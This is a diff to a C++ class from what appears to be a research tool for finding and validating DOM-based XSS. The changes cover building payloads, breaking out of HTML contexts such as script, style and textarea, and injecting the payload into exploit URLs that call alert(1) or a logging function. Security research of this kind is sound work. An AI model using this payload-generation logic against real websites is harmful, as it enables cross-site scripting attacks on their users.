@@ -71,6 +71,12 @@ std::string Metadata::get_url() const {
     return this->url;
 }
 
+std::string Metadata::get_comma_escaped_url() const {
+    std::string encoded(this->url);
+    replaceAll(encoded, ",", "%2C");
+    return encoded;
+}
+
 std::string Metadata::get_sink() const {
     return this->sink;
 }
@@ -373,6 +379,11 @@ std::string Metadata::get_payload() const {
 }
 
 std::string Metadata::generate_exploit_from_scratch() const {
+    std::string alert = "alert(1)";
+    return generate_exploit_from_scratch(alert);
+}
+
+std::string Metadata::generate_exploit_from_scratch(const std::string &function) const {
         // // Try to generate an attribute payload on the fly:
         // // Exploit.success: false
         // // Exploit.status: failure
@@ -383,7 +394,6 @@ std::string Metadata::generate_exploit_from_scratch() const {
         // // Exploit.quote_type: '
         // // Exploit.tag: script
     std::string payload = "";
-    std::string function = "alert(1)";
     if (is_initialized()) {
         if (has_valid_exploit()) {
             if (get_exploit_type() == Exploit_Type::Html) {
@@ -393,8 +403,8 @@ std::string Metadata::generate_exploit_from_scratch() const {
                     payload += ">";
                 }
                 // Now break out of non-executing contexts
-                //payload += "</iframe></style></script></object></embed></textarea>";
-                payload += "</iframe></script>";
+                payload += "</iframe></style></script></object></embed></textarea>";
+                //payload += "</iframe></script>";
                 // Add execution tags
                 if ((get_sink() == "innerHTML") ||
                     (get_sink() == "outerHTML") ||
@@ -541,36 +551,41 @@ std::string Metadata::generate_exploit_url(const std::string& payload) const
         return "";
     }
 
-    std::string url = get_url();
+    std::string url = get_comma_escaped_url();
     std::string original_payload = get_payload();
-    if (original_payload != "") {
-        std::string uuid_without_dashes = std::regex_replace(get_exploit_uuid(), std::regex("-"), "");
+    std::string uuid_without_dashes = std::regex_replace(get_exploit_uuid(), std::regex("-"), "");
+
+    if (original_payload == "") {
+        original_payload = generate_exploit_from_scratch("taintfoxLog('" + uuid_without_dashes + "')");
+    } else {
         original_payload = std::regex_replace(original_payload, std::regex("taintfoxLog\\(1\\)"), "taintfoxLog('" + uuid_without_dashes + "')");
-        // Get URL encoded string
-        std::string encoded_payload = UriEncode(original_payload);
-        std::string double_encoded_payload = UriEncode(encoded_payload);
-
-        // Try replacing the original payload with our new one
-        size_t payload_pos = url.find(original_payload);
-        size_t encoded_payload_pos = url.find(encoded_payload);
-        size_t double_encoded_payload_pos = url.find(double_encoded_payload);
-
-        // std::cout << "original: " << original_payload << " " << payload_pos << std::endl;
-        // std::cout << "encoded:  " << encoded_payload << " " << encoded_payload_pos <<  std::endl;
-        // std::cout << "dencoded: " << double_encoded_payload << " " << double_encoded_payload_pos << std::endl;
-        // std::cout << "url:      " << url << std::endl;
-
-        replaceAll(url, original_payload, payload);
-        replaceAll(url, encoded_payload, payload);
-        replaceAll(url, double_encoded_payload, payload);
     }
+
+    // Get URL encoded string
+    std::string encoded_payload = UriEncode(original_payload);
+    std::string double_encoded_payload = UriEncode(encoded_payload);
+
+    // Try replacing the original payload with our new one
+    size_t payload_pos = url.find(original_payload);
+    size_t encoded_payload_pos = url.find(encoded_payload);
+    size_t double_encoded_payload_pos = url.find(double_encoded_payload);
+
+    // std::cout << "original: " << original_payload << " " << payload_pos << std::endl;
+    // std::cout << "encoded:  " << encoded_payload << " " << encoded_payload_pos <<  std::endl;
+    // std::cout << "dencoded: " << double_encoded_payload << " " << double_encoded_payload_pos << std::endl;
+    // std::cout << "url:      " << url << std::endl;
+
+    replaceAll(url, original_payload, payload);
+    replaceAll(url, encoded_payload, payload);
+    replaceAll(url, double_encoded_payload, payload);
+
     // Check if the url was changed
-    if (url == get_url()) {
-        if (url.find("#") == std::string::npos) {
-            url += hash;
-        }
-        url += payload;
-    }
+    // if (url == get_comma_escaped_url()) {
+    //     if (url.find("#") == std::string::npos) {
+    //         url += hash;
+    //     }
+    //     url += payload;
+    // }
 
     std::cout << url << std::endl;
     return url;
@@ -589,40 +604,48 @@ std::string Metadata::get_generated_exploit() const {
 }
 
 void Metadata::print(std::ostream& os) const {
-    os << get_uuid() << ", ";
+    os << get_uuid() << ",";
+    os << get_original_uuid() << ",";
+    os << get_exploit_uuid() << ",";
     os << get_sanitizer_score() << ",";
-    os << get_domain() << ", ";
-    os << get_source() << ", ";
-    os << get_sink() << ", ";
-    os << get_hash() << ", ";
-    os << get_sanitizer_hash() << ", ";
-    os << get_twenty_five_million_flows_id() << ", ";
-    os << get_script() << ", ";
-    os << get_line() << ", ";
-    os << get_exploit_tag() << ", ";
-    os << get_exploit_token() << ", ";
-    os << get_exploit_quote_type() << ", ";
-    os << is_exploit_successful() << ", ";
-    os << get_url() << ", ";
+    os << get_domain() << ",";
+    os << get_source() << ",";
+    os << get_sink() << ",";
+    os << get_hash() << ",";
+    os << get_sanitizer_hash() << ",";
+    os << get_twenty_five_million_flows_id() << ",";
+    os << get_script() << ",";
+    os << get_line() << ",";
+    os << get_exploit_tag() << ",";
+    os << get_exploit_token() << ",";
+    os << get_exploit_quote_type() << ",";
+    os << is_exploit_successful() << ",";
+    os << get_exploit_status() << ",";
+    os << get_payload() << ",";
+    os << get_comma_escaped_url() << ",";
 }
 
 void Metadata::printHeader(std::ostream& os)
 {
-    os << "uuid , ";
+    os << "uuid,";
+    os << "uuid_original,";
+    os << "uuid_exploit,";
     os << "sanitizer_score,";
-    os << "domain, ";
-    os << "source, ";
-    os << "sink, ";
-    os << "hash, ";
-    os << "sanitizer_hash, ";
-    os << "twenty_five_million_flows_id, ";
-    os << "script, ";
-    os << "line, ";
-    os << "exploit_tag, ";
-    os << "exploit_token, ";
-    os << "exploit_quote_type, ";
-    os << "exploit_successful, ";
-    os << "url, ";
+    os << "domain,";
+    os << "source,";
+    os << "sink,";
+    os << "hash,";
+    os << "sanitizer_hash,";
+    os << "twenty_five_million_flows_id,";
+    os << "script,";
+    os << "line,";
+    os << "exploit_tag,";
+    os << "exploit_token,";
+    os << "exploit_quote_type,";
+    os << "exploit_successful,";
+    os << "exploit_status,";
+    os << "payload,";
+    os << "url,";
 }
 
 int Metadata::get_replace_end_param() const {
